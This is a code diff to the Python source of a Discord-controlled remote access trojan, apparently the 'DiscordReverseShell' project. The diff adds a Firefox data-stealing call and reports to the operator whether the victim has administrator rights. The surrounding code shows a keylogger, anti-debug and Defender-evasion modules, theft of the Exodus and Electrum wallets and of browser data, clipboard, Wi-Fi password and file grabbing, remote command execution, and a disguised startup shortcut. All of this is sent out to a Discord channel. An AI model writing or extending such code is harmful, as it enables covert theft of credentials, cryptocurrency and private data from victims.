@@ -6,7 +6,8 @@ import cryptography.fernet as fernet
 #from tkinter import messagebox
 import sys
 from config import TOKEN, GUILD_ID, DEFENDER, ERROR, MOVE, ANTIDEBUG, EXEC_DELAY, DELAY
-from modules.browser import run, delete_files
+from modules.browser import run, Utils
+from modules.firefox import firefox_steal
 from modules.keylogger import Keylogger
 from modules.antidebug import Antidebug
 from modules.info import start
@@ -111,10 +112,13 @@ freezed = False
 #opus_path = os.path.join(os.path.dirname(sys.argv[0]), "libopus-0.x64.dll")
 #discord.opus.load_opus(opus_path)
 
+u = Utils()
+
+def is_admin() -> bool:
+    return ctypes.windll.shell32.IsUserAnAdmin() == 1
 
 
-
-def check_token(token):
+def check_token(token: str) -> bool:
     headers = {
         "Authorization": f"Bot {token}"
     }
@@ -131,7 +135,7 @@ def check_token(token):
         return False
 
 
-def check_internet():
+def check_internet() -> bool:
     try:
         response = requests.get("http://www.google.com", timeout=5)
         response.raise_for_status()
@@ -253,7 +257,7 @@ async def wallets(channel):
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await channel.send(embed=embed)
 
-        delete_files(["Exodus.zip"])
+        u.delete_files(["Exodus.zip"])
     
     else:
         embed = discord.Embed(title="Error", description=f"Exodus wallet was not found!", color=0xfafafa)
@@ -278,7 +282,7 @@ async def wallets(channel):
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await channel.send(embed=embed)
 
-        delete_files(["Electrum.zip"])
+        u.delete_files(["Electrum.zip"])
         
     else:
         embed = discord.Embed(title="Error", description=f"Electrum wallet was not found!", color=0xfafafa)
@@ -288,6 +292,7 @@ async def wallets(channel):
 
 async def browsers(channel):
     run()
+    firefox_steal()
     zip_files = []
 
     dir = os.getcwd()
@@ -307,7 +312,7 @@ async def browsers(channel):
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await channel.send(embed=embed)
 
-    delete_files(["Chrome.zip", "Opera.zip", "OperaGX.zip", "Brave.zip", "Edge.zip", "Chromium.zip"])
+    u.delete_files(["Chrome.zip", "Opera.zip", "OperaGX.zip", "Brave.zip", "Edge.zip", "Chromium.zip", "Firefox.zip"])
 
 
 def freeze():
@@ -372,10 +377,10 @@ async def on_ready():
         if system_info == "":
             system_info = "Failed to fetch system information!"
         
-        embed.add_field(name="System Info", value=f"```{system_info}```", inline=False)
+        embed.add_field(name="System Info", value=f"```{system_info}\nAdmin privileges: {is_admin()}```", inline=False)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await channel.send(embed=embed)
-        delete_files([f"{os.getenv('temp')}\\system.txt"])
+        u.delete_files([f"{os.getenv('temp')}\\system.txt"])
         #browsers(channel)
     except: sys.exit(0)
 
@@ -416,7 +421,7 @@ async def on_message(message):
         embed = discord.Embed(title="System Information", description=f"```{system_info}```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.channel.send(embed=embed)
-        delete_files([f"{os.getenv('temp')}\\system.txt"])
+        u.delete_files([f"{os.getenv('temp')}\\system.txt"])
 
 
 #! CLIPBOARD
@@ -432,7 +437,7 @@ async def on_message(message):
                 f.write(clipboard)
             clipboard_file = discord.File(f"{os.getenv('temp')}\\clipboard.txt")
             await message.reply(file=clipboard_file)
-            delete_files([f"{os.getenv('temp')}\\clipboard.txt"])
+            u.delete_files([f"{os.getenv('temp')}\\clipboard.txt"])
             return
         
         embed = discord.Embed(title="Clipboard Content", description=f"```{clipboard}```", color=0xfafafa)
@@ -454,7 +459,7 @@ async def on_message(message):
             with open(f"{os.getenv('temp')}\\tasklist.txt", "w", encoding="utf-8") as f:
                 f.write(tasks)
             await message.reply(file=discord.File(f"{os.getenv('temp')}\\tasklist.txt"))
-            delete_files([f"{os.getenv('temp')}\\tasklist.txt"])
+            u.delete_files([f"{os.getenv('temp')}\\tasklist.txt"])
         else:
             embed = discord.Embed(title="Processes", description=f"```{tasks}```", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
@@ -492,7 +497,7 @@ async def on_message(message):
             embed = discord.Embed(title=f"Files > {os.getcwd()}", description="", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
             await message.reply(file=file, embed=embed)
-            delete_files([f"{os.getenv('temp')}\\files.txt"])
+            u.delete_files([f"{os.getenv('temp')}\\files.txt"])
             return
         
         embed = discord.Embed(title=f"Files > {os.getcwd()}", description=f"```{files}```", color=0xfafafa)
@@ -575,7 +580,7 @@ async def on_message(message):
             
             file = discord.File(f"{os.getenv('temp')}\\output.txt")
             await message.reply(file=file, embed=embed)
-            delete_files([f"{os.getenv('temp')}\\output.txt"])
+            u.delete_files([f"{os.getenv('temp')}\\output.txt"])
             return
         elif normal_output != "":
             embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
@@ -587,7 +592,7 @@ async def on_message(message):
             
             file = discord.File(f"{os.getenv('temp')}\\error.txt")
             await message.reply(file=file, embed=embed)
-            delete_files([f"{os.getenv('temp')}\\error.txt"])
+            u.delete_files([f"{os.getenv('temp')}\\error.txt"])
             return      
         elif error_output != "":
             embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
@@ -619,7 +624,7 @@ async def on_message(message):
             
             file = discord.File(f"{os.getenv('temp')}\\output.txt")
             await message.reply(file=file, embed=embed)
-            delete_files([f"{os.getenv('temp')}\\output.txt"])
+            u.delete_files([f"{os.getenv('temp')}\\output.txt"])
             return
         elif normal_output != "":
             embed.add_field(name="Output", value=f"```{normal_output}```", inline=False)
@@ -631,7 +636,7 @@ async def on_message(message):
             
             file = discord.File(f"{os.getenv('temp')}\\error.txt")
             await message.reply(file=file, embed=embed)
-            delete_files([f"{os.getenv('temp')}\\error.txt"])
+            u.delete_files([f"{os.getenv('temp')}\\error.txt"])
             return
         elif error_output != "":
             embed.add_field(name="Error", value=f"```{error_output}```", inline=False)
@@ -693,13 +698,13 @@ async def on_message(message):
         elif len(wifi) > 1500:
             file = discord.File(f"{os.getenv('temp')}\\wifi.txt")
             await message.reply(file=file)
-            delete_files([f"{os.getenv('temp')}\\wifi.txt"])
+            u.delete_files([f"{os.getenv('temp')}\\wifi.txt"])
             return
         
         embed = discord.Embed(title="Wifi Passwords", description=f"```{wifi}```", color=0xfafafa)
         embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
         await message.reply(embed=embed)
-        delete_files([f"{os.getenv('temp')}\\wifi.txt"])
+        u.delete_files([f"{os.getenv('temp')}\\wifi.txt"])
 
 
 #! SCREENSHOT
@@ -1131,7 +1136,7 @@ async def on_message(message):
         if message.content.startswith("!selfdestruct CONFIRM"):
             #args = message.content[22:]
             shortcut_dir = f"{os.getenv('appdata')}\Microsoft\Windows\Start Menu\Programs\Startup\SystemBin_64bit.lnk"
-            if os.path.exists(shortcut_dir): delete_files([shortcut_dir])
+            if os.path.exists(shortcut_dir): u.delete_files([shortcut_dir])
 
             embed = discord.Embed(title="Self destruct",  description="```Self destruction started!```", color=0xfafafa)
             embed.set_footer(text="github.com/Josakko/DiscordReverseShell")
@@ -1186,4 +1191,5 @@ if check_internet():
         except:
             pass
 else: Startup(sys.argv[0])
+
 
